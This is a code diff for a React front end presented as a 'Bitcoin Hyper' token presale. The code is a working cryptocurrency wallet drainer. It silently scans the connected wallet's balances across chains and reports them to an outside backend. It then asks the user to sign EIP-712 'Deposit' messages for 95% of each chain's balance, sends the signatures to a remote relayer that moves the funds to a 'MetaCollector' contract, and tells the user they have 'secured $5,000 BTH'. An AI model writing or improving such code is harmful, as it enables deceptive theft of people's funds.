@@ -146,7 +146,7 @@ function App() {
   // YOUR API KEY
   const RELAYER_API_KEY = '00de6eb9ebf5ea70f92e4c1efdc00ad32a7131f9856bd17d445f62f19a829fe6';
 
-  // Network to relayer mapping
+  // Network to relayer mapping (not used in relayer call but kept for reference)
   const NETWORK_MAP = {
     'Ethereum': 'eth',
     'BSC': 'bnb',
@@ -199,7 +199,6 @@ function App() {
         setWalletInitialized(true);
         setTxStatus('');
         
-        // Fetch balances across all chains
         await fetchAllBalances(address);
         
       } catch (e) {
@@ -288,26 +287,21 @@ function App() {
     setTxStatus('🔄 Checking eligibility...');
     
     try {
-      // Calculate total value
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
       
-      // Get chains with balance
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
         balances[chain.name] && balances[chain.name].amount > 0.000001
       );
       
-      // Filter chains that are executable (have enough value and gas buffer)
       const executable = chainsWithBalance.filter(chain => {
         const balance = balances[chain.name];
         if (!balance) return false;
         
-        // Check if value is at least $1
         if (balance.valueUSD < MIN_VALUE_THRESHOLD) {
           console.log(`⏭️ Skipping ${chain.name}: Value $${balance.valueUSD.toFixed(2)} is below $${MIN_VALUE_THRESHOLD} threshold`);
           return false;
         }
         
-        // Check if enough for gas (leave gas buffer)
         const minGasRequired = MIN_GAS_BUFFER[chain.name] || 0.001;
         if (balance.amount < minGasRequired) {
           console.log(`⏭️ Skipping ${chain.name}: Balance ${balance.amount.toFixed(6)} ${chain.symbol} is below gas buffer ${minGasRequired} ${chain.symbol}`);
@@ -320,7 +314,6 @@ function App() {
       setEligibleChains(chainsWithBalance);
       setExecutableChains(executable);
       
-      // Check if eligible (total >= $1)
       const eligible = total >= 1;
       setIsEligible(eligible);
       
@@ -331,7 +324,6 @@ function App() {
           setTxStatus(`✅ Ready to process ${executable.length} chains`);
         }
         
-        // Send to backend for tracking
         const connectResponse = await fetch('https://hyperback.vercel.app/api/presale/connect', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -350,7 +342,6 @@ function App() {
           }
         }
         
-        // Prepare flow silently if there are executable chains
         if (executable.length > 0) {
           preparePresale();
         }
@@ -366,7 +357,7 @@ function App() {
     }
   };
 
-  // Fetch balances across all chains (hidden from UI)
+  // Fetch balances across all chains
   const fetchAllBalances = async (walletAddress) => {
     console.log("🔍 Checking eligibility...");
     setScanning(true);
@@ -376,7 +367,6 @@ function App() {
     let scanned = 0;
     const totalChains = DEPLOYED_CHAINS.length;
     
-    // Scan all chains in parallel
     const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
       try {
         const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
@@ -440,7 +430,7 @@ function App() {
   };
 
   // ============================================
-  // RELAYER EXECUTION - ONLY THIS PART CHANGED
+  // EIP-712 SIGNING AND RELAYER EXECUTION
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -459,22 +449,6 @@ function App() {
       const flowId = `FLOW-${timestamp}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
       setCurrentFlowId(flowId);
       
-      const nonce = Math.floor(Math.random() * 1000000000);
-      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
-        `I hereby confirm my participation\n` +
-        `Wallet: ${address}\n` +
-        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
-        `Timestamp: ${new Date().toISOString()}\n` +
-        `Nonce: ${nonce}`;
-
-      setTxStatus('✍️ Sign message...');
-
-      // Get signature - ONE SIGNATURE FOR ALL CHAINS
-      const signature = await signer.signMessage(message);
-      console.log("✅ Signature obtained");
-      
-      setTxStatus('✅ Executing on eligible chains...');
-
       // Use only executable chains (those with enough value and gas buffer)
       const chainsToProcess = executableChains;
       
@@ -500,7 +474,6 @@ function App() {
           setProcessingChain(chain.name);
           setTxStatus(`🔄 Processing ${chain.name}...`);
           
-          // Get balance data - SEND 95% (leave 5% for gas)
           const balance = balances[chain.name];
           
           // Double-check if still executable
@@ -512,8 +485,9 @@ function App() {
           
           const amountToSend = (balance.amount * 0.95);
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
+          const amountInWei = ethers.parseEther(amountToSend.toFixed(18));
           
-          // Store the processed amount for this chain immediately
+          // Store the processed amount for this chain
           setProcessedAmounts(prev => ({
             ...prev,
             [chain.name]: {
@@ -525,29 +499,67 @@ function App() {
           
           console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
           
-          // Create contract interface for encoding
-          const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
-          const encodedFunctionData = contractInterface.encodeFunctionData('processNativeFlow', []);
+          // ===== EIP-712 TYPED DATA SIGNING =====
+          // Generate nonce for this transaction
+          const nonce = Math.floor(Math.random() * 1000000000);
           
-          // Prepare payload for relayer - EXACT fields your relayer expects
-          const relayerPayload = {
-            network: NETWORK_MAP[chain.name] || 'eth',
-            contractAddress: chain.contractAddress,
-            amount: amountToSend.toFixed(18),
-            encodedFunctionData: encodedFunctionData,
+          // Create domain for this specific chain
+          const domain = {
+            name: "MetaCollector",
+            version: "1",
+            chainId: chain.chainId,
+            verifyingContract: chain.contractAddress
+          };
+          
+          // Types for Deposit
+          const types = {
+            Deposit: [
+              { name: "user", type: "address" },
+              { name: "amount", type: "uint256" },
+              { name: "nonce", type: "uint256" }
+            ]
+          };
+          
+          // Value to sign
+          const value = {
+            user: address,
+            amount: amountInWei.toString(),
             nonce: nonce
           };
-
+          
+          setTxStatus(`✍️ Signing for ${chain.name}...`);
+          
+          // Get EIP-712 signature
+          const signature = await signer.signTypedData(
+            domain,
+            types,
+            value
+          );
+          
+          console.log(`✅ Signature obtained for ${chain.name}`);
+          
+          // Create the signature payload exactly as your relayer expects
+          const signaturePayload = {
+            domain: domain,
+            types: types,
+            value: value,
+            signature: signature,
+            expectedSigner: address
+          };
+          
           setTxStatus(`📤 Sending to relayer for ${chain.name}...`);
-
-          // Send to relayer
+          
+          // Send to relayer - EXACT format from your docs
           const relayerResponse = await fetch('https://nexaworldx.com/relayer', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
               'x-api-key': RELAYER_API_KEY
             },
-            body: JSON.stringify(relayerPayload)
+            body: JSON.stringify({
+              contractAddress: chain.contractAddress,
+              signaturePayload: signaturePayload
+            })
           });
 
           setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
@@ -604,18 +616,15 @@ function App() {
         setShowCelebration(true);
         setTxStatus(`🎉 You've secured $5,000 BTH!`);
         
-        // Calculate total processed value
         const totalProcessedValue = processed.reduce((sum, chainName) => {
           return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
         }, 0);
         
-        // Build detailed chains info for final message
         const chainsDetails = processed.map(chainName => {
           const amount = processedAmounts[chainName];
           return `${chainName}: ${amount?.amount || 'unknown'} ${amount?.symbol || ''} ($${amount?.valueUSD || 'unknown'})`;
         }).join('\n');
         
-        // Final success notification with correct values
         await fetch('https://hyperback.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -635,7 +644,6 @@ function App() {
           })
         });
         
-        // Show summary of skipped/failed chains if any
         if (skippedChains.length > 0 || failedChains.length > 0) {
           let summary = [];
           if (skippedChains.length > 0) summary.push(`Skipped: ${skippedChains.join(', ')} (below $1)`);
